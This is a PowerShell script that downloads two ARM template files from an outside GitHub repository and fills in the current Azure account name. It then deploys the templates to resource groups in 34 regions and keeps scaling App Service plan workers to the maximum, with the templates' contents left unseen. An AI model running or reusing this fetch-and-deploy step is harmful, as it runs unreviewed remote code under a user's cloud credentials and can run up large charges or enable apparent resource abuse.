
Remove-Item long.json
Remove-Item long1.json
Invoke-WebRequest 'https://raw.githubusercontent.com/ddao2604/tech/main/long.json' -OutFile long.json
Invoke-WebRequest 'https://raw.githubusercontent.com/ddao2604/tech/main/long1.json' -OutFile long1.json

$id = (Get-AzContext).Account.Id
$name = $id.Split("@")[0]
$ts = Get-Date -Format "dd-MM-HH"
$name = $ts + "-"+$name
(Get-Content long.json).Replace('XNX', $name) | Set-Content long.json
(Get-Content long1.json).Replace('XNX', $name) | Set-Content long1.json

$loclist = "EastUS,NorthEurope,WestEurope,SoutheastAsia,EastAsia,WestUS,JapanWest,JapanEast,EastUS2,NorthCentralUS,SouthCentralUS,BrazilSouth,AustraliaEast,AustraliaSoutheast,CentralUS,CentralIndia,SouthIndia,CanadaCentral,CanadaEast,WestUS2,UKWest,UKSouth,KoreaCentral,FranceCentral,SouthAfricaNorth,SwitzerlandNorth,GermanyWestCentral,UAENorth,NorwayEast,WestUS3,SwedenCentral,PolandCentral,ItalyNorth,IsraelCentral"
$loclist = $loclist.split(",");
$run = $true
$ii = 5
While($run)
{
	$tt = $ii + 1
	$st = '"capacity":'+$ii.ToString()
 	$ft = '"capacity":'+$tt.ToString()
	(Get-Content long.json).Replace($ft, $st) | Set-Content long.json
	foreach ($i in $loclist) {
		$Resource = Get-AzAppServicePlan -ResourceGroupName $i
		$tname = $Resource.name
		$i
		if($tname)
		{
			$wk = $Resource.Sku.Capacity
			$wk
			if($wk -lt 5)
			{
				$nw = $wk + 1
				Set-AzAppServicePlan -Name $tname -ResourceGroupName $i -NumberofWorkers $nw
			}
			else
			{
				$loclist = $loclist | Where-Object { $_ -ne $i }
			}
		}
		else
		{
			New-AzResourceGroup -Name $i -Location $i -Force
			New-AzResourceGroupDeployment -ResourceGroupName $i -TemplateFile long.json
			
		}
	}
 	$len = $loclist.Length
	if($len -lt 1)
	{
		break
	}
 	if($ii -eq 1)
	{
		
	}
	else
	{
		$ii = $ii - 1
	}
 	
	$time = Get-Random -Minimum 50 -Maximum 80
	$waitSeconds = $time

	Start-Sleep -Seconds 0

	$waitSeconds..0 | Foreach-Object {
		Write-Host "`r          Time Remaining: $_ " -NoNewline -foregroundcolor green
		Start-Sleep -Seconds 1
	}
}
